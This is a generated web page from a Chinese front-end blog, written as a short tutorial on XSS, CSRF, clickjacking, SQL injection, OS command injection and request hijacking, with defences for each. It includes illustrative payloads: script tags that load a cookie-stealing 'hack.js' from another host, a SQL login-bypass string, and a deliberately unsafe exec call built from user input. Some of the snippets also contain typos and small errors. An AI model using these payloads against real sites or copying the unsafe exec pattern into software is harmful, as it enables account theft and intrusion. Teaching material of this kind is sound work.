@@ -1,0 +1,585 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="大大大大前端" href="https://10nlife.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="大大大大前端" href="https://10nlife.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="大大大大前端" href="https://10nlife.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="前端 网络安全" />
+
+
+<link rel="canonical" href="https://10nlife.github.io/2021/08/08/base/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%97%B7/">
+
+
+
+  <title>
+网络安全知识嗷 - 计算机基础 |
+大大大大前端 = 前端很大，我要忍一下</title>
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">网络安全知识嗷
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2021-08-08 09:14:09">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2021-08-08T09:14:09+08:00">2021-08-08</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">大大大大前端</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gicivghyooj20zk0m8dir.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeu7txpzj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giph47e9vtj20zk0m8x6l.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclfw2t96j20zk0m8x6p.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/base/" itemprop="item" rel="index" title="分类于 计算机基础"><span itemprop="name">计算机基础</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://10nlife.github.io/2021/08/08/base/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%97%B7/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="10nlife">
+    <meta itemprop="description" content="前端很大，我要忍一下, ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="大大大大前端">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h4 id="1-xss"><a class="anchor" href="#1-xss">#</a> 1. XSS</h4>
+<p>Cross Site Scripting，跨站点脚本攻击，通过存在安全漏洞的 Web 网站注册用户的浏览器内运行非法的非本站点 HTML 或者是 JS 进行的一种攻击</p>
+<p>它可以利用虚假的输入表单骗取用户信息，利用脚本窃取用户的 cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求</p>
+<ul>
+<li>反射性攻击 - url 参数直接注入</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通</span></span><br><span class="line"><span class="attr">http</span>:<span class="comment">//lcoalhost:3000/?from=china</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// alert尝试</span></span><br><span class="line">http:<span class="comment">//localhost:3000/?form=&lt;script&gt;alert(3)&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取cookie</span></span><br><span class="line">http:<span class="comment">//lcoalhost:3000/?form=&lt;script src=&quot;http://localhost:4000/hack.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造cookie进行登录</span></span><br><span class="line"><span class="built_in">document</span>.cookie = <span class="string">&quot;伪造的cookie&quot;</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>存储型攻击 - 存储到 DB 时注入</li>
+</ul>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--评论--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--跨站脚本注入--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过评论功能来注入其他域的脚本--&gt;</span></span><br><span class="line">我来了<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:4000/hack.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>防范手段：</p>
+<ul>
+<li>HEAD</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-XSS-Protection&#x27;</span>, <span class="number">0</span>)	<span class="comment">// 禁止XSS过滤</span></span><br></pre></td></tr></table></figure></p>
+<p>启用 XSS 过滤（通常浏览器时默认的），如果监测到跨站脚本攻击，浏览器将会清除页面（删除掉不安全的部分）</p>
+<ul>
+<li>CSP</li>
+</ul>
+<p>内容安全策略是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括 XSS 和数据注入等攻击</p>
+<p>本质时建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行，我们只需要配置规则，如何拦截是浏览器自己实现的</p>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 只允许加载本站资源</span></span><br><span class="line">Content-Security-Policy: defalut-src <span class="string">&#x27;self&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 只允许加载HTTPS协议图片</span></span><br><span class="line">Content-Security-Policy: img-src https:<span class="comment">//*</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 不允许加载任何来源框架</span></span><br><span class="line">Content-Security-Policy: child-src <span class="string">&#x27;none&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>转义字符</li>
+</ul>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--ejs转义小知识--&gt;</span></span><br><span class="line">&lt;% code %&gt; 用于执行其中的javascript代码</span><br><span class="line">&lt;%= code %&gt;会对code进行html转义</span><br><span class="line">&lt;%- code %&gt;将不会进行转移，原样输出</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>黑名单</li>
+</ul>
+<p>思想：用户的输入永远不可信任，最普遍的做法就是转义输入输出的内容，对于引号，尖括号，斜杠进行转义</p>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">    str = str.replace(<span class="regexp">/&amp;/g</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/&lt;/g</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/&gt;/g</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/&quot;/g</span>, <span class="string">&#x27;&amp;guto;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/&#x27;/g</span>, <span class="string">&#x27;&amp;#39;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/`/g</span>, <span class="string">&#x27;&amp;#96;&#x27;</span>)</span><br><span class="line">    str = str.replace(<span class="regexp">/\//g</span>, <span class="string">&#x27;&amp;#x2F;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 不能处理富文本编辑，不然富文本的格式也会过滤掉</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>白名单</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> xss = <span class="built_in">require</span>(<span class="string">&#x27;xss&#x27;</span>)	<span class="comment">// 使用xss库</span></span><br><span class="line"><span class="keyword">let</span> html = xss(<span class="string">&#x27;&lt;h1 id=&quot;title&quot;&gt;XSS DEMO&lt;/h1&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(html)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>HttpOnly</li>
+</ul>
+<p>这是预防 XSS 攻击窃取用户 cookie 最有效的防御有段，Web 应用程序在设置 cookie 时，将其属性设置为 HttpOnly，就可以避免该网站的 cookie 被客户端恶意 JavaScript 窃取，保存用户 cookie 信息</p>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;uid=112; Path=/; HttpOnly&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-csrf"><a class="anchor" href="#2-csrf">#</a> 2. CSRF</h4>
+<p>Cross Site Require Forgery 跨站请求伪造，是一种常见的 Web 攻击，他利用用户已登陆的身份，在用户毫不知情的情况下以用户的名义完成操作</p>
+<ul>
+<li>用户已经登陆了站点 A，并在本地记录了 cookie</li>
+<li>在用户没有等处站点 A 的情况下（也就是 cookie 生效的情况下），访问了恶意攻击者提供的引诱危险站点 B（B 站点要求访问站点 A）</li>
+<li>站点 A 没有做任何的 CSRF 防御</li>
+</ul>
+<p>危害：利用用户登录态，完成业务请求，冒充用户发帖背锅，损害网站声誉</p>
+<p>防御手段：</p>
+<ul>
+<li>Referer Check - Http 不发送 referer</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> referer = ctx.request.header.referer</span><br><span class="line"><span class="built_in">console</span>.log(referer)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>验证码（增加人机识别的过程）</li>
+<li>cookie 值进行 hash，攻击者在访问信任网站 A 时，虽然浏览器可以在请求中带上 cookie，但是网站 A 确不仅仅通过 cookie 来判断用户身份，同时通过用户发送过来的内容中的伪随机数请求真正是用户发送的，攻击者在请求 A 的时候，不能再提交的内容中产生伪随机数</li>
+</ul>
+<h4 id="3点击劫持-clickjacking"><a class="anchor" href="#3点击劫持-clickjacking">#</a> 3. 点击劫持 - clickjacking</h4>
+<p>点击劫持是一种视觉的欺骗手段，攻击者将需要攻击的网站通过 iframe 嵌套的方式嵌套入自己的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱惑用户点击</p>
+<p>防御手段：</p>
+<ul>
+<li>X-FRAME-OPTIONS：是一个 HTTP 响应头，在现代浏览器有一个很好的支持，这个 HTTP 响应头，就是为了防御用 iframe 嵌套的点击劫持攻击
+<ul>
+<li>DENY：表示页面不允许通过 iframe 的方式展示</li>
+<li>SAMEORIGIN：表示页面可以在相同域名下通过 iframe 的方式展示</li>
+<li>ALLOW-FORM：表示页面可以在指定来源的 iframe 中展示</li>
+</ul>
+</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.set(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>: <span class="string">&#x27;DENY&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>js 方式：</li>
+</ul>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// self 是对当前窗口自身的引用 window属性是等价的</span></span><br><span class="line"><span class="comment">// top是返回顶层窗口，即浏览器窗口</span></span><br><span class="line"><span class="keyword">if</span>(self === top)&#123;</span><br><span class="line">    <span class="keyword">var</span> style = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;click-jack&#x27;</span>)</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(style)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    top.location = self.location</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="4-sql注入"><a class="anchor" href="#4-sql注入">#</a> 4. SQL 注入</h4>
+<p>填入特殊的密码：1 ‘or’ 1 ‘=’ 1</p>
+<p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> test.user</span><br><span class="line"><span class="keyword">WHERE</span> username <span class="operator">=</span> <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line"><span class="keyword">AND</span> password <span class="operator">=</span> <span class="string">&#x27;1 &#x27;</span><span class="keyword">or</span><span class="string">&#x27; 1 &#x27;</span><span class="operator">=</span><span class="string">&#x27; 1&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>防范手段：</p>
+<p>所有查询语句建议使用数据库提供的参数化查询接口 **，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，既不要直接拼接 SQL 语句</p>
+<h4 id="5-os命令注入"><a class="anchor" href="#5-os命令注入">#</a> 5. OS 命令注入</h4>
+<p>和 SQL 一样，只不过注入的内容是针对操作系统的，通过 Web 应用，执行非法的操作系统指令来达到攻击的目的</p>
+<p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>)</span><br></pre></td></tr></table></figure></p>
+<h4 id="6-请求劫持"><a class="anchor" href="#6-请求劫持">#</a> 6. 请求劫持</h4>
+<ul>
+<li>DNS 劫持 DNS 服务器被篡改，修改了域名解析的结果，使得访问到的不是预期的 ip</li>
+<li>HTTP 劫持 只能使用 HTTPS 了</li>
+</ul>
+
+      <div class="tags">
+          <a href="/tags/%E5%89%8D%E7%AB%AF-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag"><i class="ic i-tag"></i> 前端 网络安全</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2021-08-08 11:34:42" itemprop="dateModified" datetime="2021-08-08T11:34:42+08:00">2021-08-08</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="10nlife 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="10nlife 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="10nlife 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>10nlife <i class="ic i-at"><em>@</em></i>大大大大前端
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://10nlife.github.io/2021/08/08/base/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%97%B7/" title="网络安全知识嗷">https://10nlife.github.io/2021/08/08/base/网络安全知识嗷/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2021/08/07/base/cookie%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%97%B7/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva1.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclj61ylzj20zk0m8b29.jpg" title="cookie相关知识嗷">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> 计算机基础</span>
+  <h3>cookie相关知识嗷</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-xss"><span class="toc-number">1.</span> <span class="toc-text"> 1. XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-csrf"><span class="toc-number">2.</span> <span class="toc-text"> 2. CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81-clickjacking"><span class="toc-number">3.</span> <span class="toc-text"> 3. 点击劫持 - clickjacking</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-sql%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text"> 4. SQL 注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text"> 5. OS 命令注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E8%AF%B7%E6%B1%82%E5%8A%AB%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text"> 6. 请求劫持</span></a></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/2021/07/31/base/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%97%B7/" rel="bookmark" title="计算机网络">计算机网络</a></li><li><a href="/2021/08/05/base/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9F%A5%E8%AF%86%E5%97%B7/" rel="bookmark" title="浏览器缓存知识嗷">浏览器缓存知识嗷</a></li><li><a href="/2021/08/06/base/%E8%B7%A8%E5%9F%9F%E7%9B%B8%E5%85%B3%E5%97%B7/" rel="bookmark" title="跨域相关嗷">跨域相关嗷</a></li><li><a href="/2021/08/07/base/cookie%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%97%B7/" rel="bookmark" title="cookie相关知识嗷">cookie相关知识嗷</a></li><li class="active"><a href="/2021/08/08/base/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%97%B7/" rel="bookmark" title="网络安全知识嗷">网络安全知识嗷</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="10nlife"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">10nlife</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">14</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">5</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">7</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3lvdXJuYW1l" title="https:&#x2F;&#x2F;github.com&#x2F;yourname"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/vue/" title="分类于 vue">vue</a>
+</div>
+
+    <span><a href="/2021/07/31/vue/vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%9F%A5%E8%AF%86%E5%97%B7-4/" title="vue全家桶知识嗷[4]">vue全家桶知识嗷[4]</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/base/" title="分类于 计算机基础">计算机基础</a>
+</div>
+
+    <span><a href="/2021/08/08/base/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E5%97%B7/" title="网络安全知识嗷">网络安全知识嗷</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/base/" title="分类于 计算机基础">计算机基础</a>
+</div>
+
+    <span><a href="/2021/08/05/base/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9F%A5%E8%AF%86%E5%97%B7/" title="浏览器缓存知识嗷">浏览器缓存知识嗷</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/base/" title="分类于 计算机基础">计算机基础</a>
+</div>
+
+    <span><a href="/2021/08/07/base/cookie%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E5%97%B7/" title="cookie相关知识嗷">cookie相关知识嗷</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/vue/" title="分类于 vue">vue</a>
+</div>
+
+    <span><a href="/2021/07/31/vue/vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%9F%A5%E8%AF%86%E5%97%B7-1/" title="vue全家桶知识嗷[1]">vue全家桶知识嗷[1]</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/vue/" title="分类于 vue">vue</a>
+</div>
+
+    <span><a href="/2021/07/31/vue/vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%9F%A5%E8%AF%86%E5%97%B7-0/" title="vue全家桶知识嗷[0]">vue全家桶知识嗷[0]</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/vue/" title="分类于 vue">vue</a>
+</div>
+
+    <span><a href="/2021/07/31/vue/vue%E5%85%A8%E5%AE%B6%E6%A1%B6%E7%9F%A5%E8%AF%86%E5%97%B7-3/" title="vue全家桶知识嗷[3]">vue全家桶知识嗷[3]</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/base/" title="分类于 计算机基础">计算机基础</a>
+</div>
+
+    <span><a href="/2021/07/31/base/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E5%97%B7/" title="计算机网络">计算机网络</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/javascript/" title="分类于 javascript">javascript</a>
+</div>
+
+    <span><a href="/2021/07/31/javascript/ES6-11%E7%9F%A5%E8%AF%86%E5%97%B7/" title="ES6-11知识嗷">ES6-11知识嗷</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/webpack/" title="分类于 webpack">webpack</a>
+</div>
+
+    <span><a href="/2021/07/31/webpack/webpack%E7%9F%A5%E8%AF%86%E5%97%B7/" title="webpack知识嗷">webpack知识嗷</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2021</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">10nlife @ 大大大大前端</span>
+  </div>
+  <div class="powered-by">
